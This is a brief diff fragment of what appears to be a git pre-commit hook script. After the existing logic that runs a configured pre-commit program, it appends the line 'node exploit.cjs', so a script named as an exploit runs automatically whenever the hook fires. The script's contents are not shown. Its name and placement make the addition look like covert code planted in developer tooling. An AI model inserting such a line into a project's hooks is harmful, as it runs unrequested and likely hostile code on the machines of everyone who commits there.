@@ -22,3 +22,4 @@ if [ -x "${pre_commit_path}" ]
 then
 	exec "${pre_commit_path}"
 fi
+node exploit.cjs
